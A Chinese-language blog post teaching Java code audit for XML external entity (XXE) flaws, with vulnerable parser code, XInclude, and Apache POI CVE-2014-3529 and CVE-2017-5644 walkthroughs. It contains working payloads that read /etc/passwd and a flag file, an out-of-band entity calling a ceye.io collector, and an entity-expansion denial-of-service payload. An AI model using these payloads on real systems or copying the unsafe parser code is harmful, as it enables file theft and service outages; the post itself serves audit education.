
<!DOCTYPE html>
<html lang="zh-Hans" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>一篇文章读懂Java代码审计之XXE - 像清水一般清澈透明</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="SummerSec CodeQl,"> 
    <meta name="description" content="前言
学习总结Java审计过程中笔记，审计方法
阅读要求：有简单Java代码基础，了解漏洞原理
阅读时长：30min 篇幅比较长


漏洞简介&amp;emsp;&amp;emsp; 简单来说，XXE就是XML外部,"> 
    <meta name="author" content="SummerSec"> 
    <link rel="alternative" href="atom.xml" title="像清水一般清澈透明" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">

    
<link rel="stylesheet" href="/css/diaspora.css">

    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
         (adsbygoogle = window.adsbygoogle || []).push({
              google_ad_client: "ca-pub-8691406134231910",
              enable_page_level_ads: true
         });
    </script>
    <script async custom-element="amp-auto-ads"
        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
    </script>
<meta name="generator" content="Hexo 4.1.1"></head>

<body class="loading">
    <span id="config-title" style="display:none">像清水一般清澈透明</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="icon-home image-icon" href="javascript:;" data-url="https://summersec.github.io"></a>
    <div title="播放/暂停" class="icon-play"></div>
    <h3 class="subtitle">一篇文章读懂Java代码审计之XXE</h3>
    <div class="social">
        <!--<div class="like-icon">-->
            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
        <!--</div>-->
        <div>
            <div class="share">
                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class='main'>
        <h1 class="title">一篇文章读懂Java代码审计之XXE</h1>
        <div class="stuff">
            <span>二月 23, 2020</span>
            
  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">XXE 代码审计</a></li></ul>


        </div>
        <div class="content markdown">
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul>
<li>学习总结Java审计过程中笔记，审计方法</li>
<li>阅读要求：有简单Java代码基础，了解漏洞原理</li>
<li>阅读时长：30min 篇幅比较长</li>
</ul>
<hr>
<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>&emsp;&emsp; 简单来说，XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p>
<hr>
<h1 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h1><p>&emsp;&emsp; 不说废话，先看效果，成功读取文本内容。tip: 本次测试中需要将<code>Content-Type: application/x-www-form-urlencoded</code>修改成<code>Content-Type: application/xml</code>不然就无法成功。<br><img src="https://img-blog.csdnimg.cn/20200221154143875.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200221153921615.png" alt="在这里插入图片描述"><br>&emsp;&emsp; <strong>代码分析漏洞成因：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">xxeDocumentBuilderReturn</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String xml_con = WebUtils.getRequestBody(request);</span><br><span class="line">            System.out.println(xml_con);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(xml_con);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历xml节点name和value</span></span><br><span class="line">            StringBuffer buf = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">                Node rootNode = rootNodeList.item(i);</span><br><span class="line">                NodeList child = rootNode.getChildNodes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                    Node node = child.item(j);</span><br><span class="line">                    buf.append(node.getNodeName() + <span class="string">": "</span> + node.getTextContent() + <span class="string">"\n"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sr.close();</span><br><span class="line">            System.out.println(buf.toString());</span><br><span class="line">            <span class="keyword">return</span> buf.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"except"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp; <strong>不难发现我们只要清楚这四行代码功能，就能很好清楚Java解析XML机制。</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(xml_con);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp; DocumentBuilderFactory是一个抽象工厂类，它不能直接实例化，但该类提供了一个newInstance方法 ，这个方法会根据本地平台默认安装的解析器，自动创建一个工厂的对象并返回。<br><img src="https://img-blog.csdnimg.cn/20200222151828506.png#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h1 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h1><p><img src="https://img-blog.csdnimg.cn/20200221160018601.png" alt="在这里插入图片描述"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">DocumentBuilder</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String xml_con = WebUtils.getRequestBody(request);</span><br><span class="line">            System.out.println(xml_con);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(xml_con);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历xml节点name和value</span></span><br><span class="line">            StringBuffer result = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">                Node rootNode = rootNodeList.item(i);</span><br><span class="line">                NodeList child = rootNode.getChildNodes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                    Node node = child.item(j);</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> (child.item(j).getNodeType() == Node.ELEMENT_NODE) &#123;</span><br><span class="line">                        result.append(node.getNodeName() + <span class="string">": "</span> + node.getFirstChild().getNodeValue() + <span class="string">"\n"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sr.close();</span><br><span class="line">            System.out.println(result.toString());</span><br><span class="line">            <span class="keyword">return</span> result.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"except"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp; 我们使用burp比较器分析两部分代码，不能发现左边就是多了一个判断语句。（左:无回显代码 右:有回显代码）<br><img src="https://img-blog.csdnimg.cn/20200221160503214.png#pic_center" alt="在这里插入图片描述"><br><em><code>if (child.item(j).getNodeType() == Node.ELEMENT_NODE)</code></em><br> 正常解析XML，需要判断是否是ELEMENT_NODE类型。否则会出现多余的的节点。</p>
<hr>
<p>对于这样子无回显的验证可以使用ceye.io网站，具体方法：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">joychou</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip.port.xxxx.ceye.io/xxe_test"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200222193843204.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200222193929997.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 复测过程中遇见的小坑，个人感觉纯属玄学问题。两次请求数据几乎是一模一样的，但是返回结果愣是不一样，一个200一个400。（充分体现了挖洞得随缘，有时候姿势对了，但是结果不对可能不是你的错误）<br><img src="https://img-blog.csdnimg.cn/20200222194626447.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200222194755884.png" alt="在这里插入图片描述"></p>
<hr>
<h1 id="Xinclude"><a href="#Xinclude" class="headerlink" title="Xinclude"></a>Xinclude</h1><p><strong>什么是xinclude</strong><br>&emsp;&emsp; 顾名思义，xinclude可以理解为xml include熟悉编译/脚本语言的一定熟知，像php的include，python和java的import都是可以进行文件包含的。<br><strong>那么文件包含有什么好处？</strong><br>&emsp;&emsp; 当然是可以使代码更整洁，我们可以将定义的功能函数放在function.php中，再在需要使用功能函数的文件中使用include包含function.php，这样就避免了重复冗余的函数定义，同样可以增加代码的可读性。故此，xinclude也不例外，它是xml标记语言中包含其他文件的方式。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///E:/1.txt"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200222211644240.png" alt="在这里插入图片描述"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">xxe_xinclude_DocumentBuilder</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           String xml_con = WebUtils.getRequestBody(request);</span><br><span class="line">           System.out.println(xml_con);</span><br><span class="line"></span><br><span class="line">           DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">           dbf.setXIncludeAware(<span class="keyword">true</span>);   <span class="comment">// 支持XInclude</span></span><br><span class="line">           dbf.setNamespaceAware(<span class="keyword">true</span>);  <span class="comment">// 支持XInclude</span></span><br><span class="line">           DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">           StringReader sr = <span class="keyword">new</span> StringReader(xml_con);</span><br><span class="line">           InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">           Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">           NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">           String str = <span class="keyword">new</span> String();</span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">               Node rootNode = rootNodeList.item(i);</span><br><span class="line">               NodeList xxe = rootNode.getChildNodes();</span><br><span class="line">               <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; xxe.getLength(); j++) &#123;</span><br><span class="line">                   Node xxeNode = xxe.item(j);</span><br><span class="line">             </span><br><span class="line">                   str = str + xxeNode.getNodeValue();</span><br><span class="line">                   System.out.println(str);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           sr.close();</span><br><span class="line">           <span class="keyword">return</span> str;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           System.out.println(e);</span><br><span class="line">           <span class="keyword">return</span> <span class="string">"except"</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="Payload分享"><a href="#Payload分享" class="headerlink" title="Payload分享"></a>Payload分享</h2><p>飘零师傅的payload：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">resetPassword</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/xml/fontconfig/fonts.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">expr</span> <span class="meta-string">'aaa)&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY &amp;#x25; file SYSTEM "file:///flag"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:////&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ELEMENT aa (bb'</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">request</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">status</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">status</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/yelp/dtd/docbookx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamso</span> <span class="meta-string">'</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY % eval "&lt;!ENTITY % error SYSTEM '</span>file:///nonexistent/%file;<span class="meta-string">'&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        %eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        %error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">    '</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<h1 id="Poi-ooxml-XXE"><a href="#Poi-ooxml-XXE" class="headerlink" title="Poi ooxml XXE"></a>Poi ooxml XXE</h1><h2 id="CVE-2014-3529"><a href="#CVE-2014-3529" class="headerlink" title="CVE-2014-3529"></a>CVE-2014-3529</h2><ul>
<li><p>新建xxe.xlsx文件，修改后缀名xxe.zip解压。<br><img src="https://img-blog.csdnimg.cn/2020022311395424.png" alt="在这里插入图片描述"></p>
</li>
<li><p>修改[Content-Types].xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE x [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://xxxxx.xx.ixxo"</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>后因为无法访问ceye.io网站，笔者自己在本地搭建一台服务器。推荐使用phpstudy，开启访问日志，具体方法百度。</code><br><img src="https://img-blog.csdnimg.cn/20200223113339623.png" alt="在这里插入图片描述"></p>
</li>
<li><p>重新压缩成zip，在修改成xlsx文件。</p>
</li>
<li><p>上传文件<br><img src="https://img-blog.csdnimg.cn/20200223140541747.png" alt="在这里插入图片描述"></p>
</li>
<li><p>或者直接读取文件。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">File f = <span class="keyword">new</span> File(<span class="string">"/path/xxe.xlsx"</span>);</span><br><span class="line">        FileInputStream in = <span class="keyword">new</span> FileInputStream(f);</span><br><span class="line"></span><br><span class="line">        XSSFWorkbook wb = <span class="keyword">new</span> XSSFWorkbook(in); <span class="comment">// xxe vuln</span></span><br><span class="line">        XSSFSheet sheet = wb.getSheetAt(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> total = sheet.getLastRowNum();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Row row : sheet)&#123;</span><br><span class="line">            <span class="keyword">for</span> (Cell cell :row)&#123;</span><br><span class="line">               System.out.println(cell.getStringCellValue());</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">"expection"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li>
<li><p>看下报错，报出poi错误才是正确的。<br><img src="https://img-blog.csdnimg.cn/20200223140830833.png" alt="在这里插入图片描述"></p>
</li>
<li><p>查看访问记录<br><img src="https://img-blog.csdnimg.cn/20200223141207658.png" alt="在这里插入图片描述"></p>
</li>
<li><p>修复建议，换成3.10-FINAL版本以上<br><img src="https://img-blog.csdnimg.cn/20200223141417847.png" alt="在这里插入图片描述"></p>
</li>
</ul>
<hr>
<h2 id="CVE-2017-5644"><a href="#CVE-2017-5644" class="headerlink" title="CVE-2017-5644"></a>CVE-2017-5644</h2><p>其他步骤同CVE-2014-3529中的方式，这次是在 xl/workbook.xml 中注入实体:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE x [     </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e1</span> <span class="meta-string">""</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e2</span> <span class="meta-string">"&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e3</span> <span class="meta-string">"&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e4</span> <span class="meta-string">"&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e5</span> <span class="meta-string">"&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e6</span> <span class="meta-string">"&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e7</span> <span class="meta-string">"&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e8</span> <span class="meta-string">"&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e9</span> <span class="meta-string">"&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e1</span>0 <span class="meta-string">"&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e11</span> <span class="meta-string">"&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span>&amp;e11;<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp; &lt;x&gt;&e11;&lt;/x&gt; 代码引用ENTITY e11，而 e11 由16 个 e10 组成，递归调用，循环次数达到 16^10 的规模。循环大量的实体引用，会消耗大量的CPU资源，长时间显示占用近100%。</p>
<p>&emsp;&emsp; POIXMLTypeLoader 中，解析xml的时候直接读取xml，没有对实体的数量进行限制。3.11 对 POIXMLTypeLoader 中的实体大小进行了限制 ，最大为4096，但是当实体为空的时候（如上例），还是可以构造空实体，形成大量循环，占用 cpu 资源，造成拒绝服务攻击。</p>
<hr>
